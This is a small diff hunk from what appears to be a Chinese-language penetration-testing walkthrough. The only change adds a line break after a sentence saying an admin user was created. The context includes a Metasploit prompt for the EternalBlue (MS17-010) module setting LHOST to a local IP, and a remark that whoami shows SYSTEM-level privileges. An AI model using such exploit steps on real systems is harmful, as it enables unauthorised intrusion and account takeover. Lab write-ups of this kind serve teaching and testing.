@@ -420,7 +420,7 @@ msf5 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.2.16
 
 ![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320629.webp)
 
-成功创建admin用
+成功创建admin用<br>
 
 **（3）通过whoami查看当前用户级别，可以发现我们获取到了最高权限system**
 
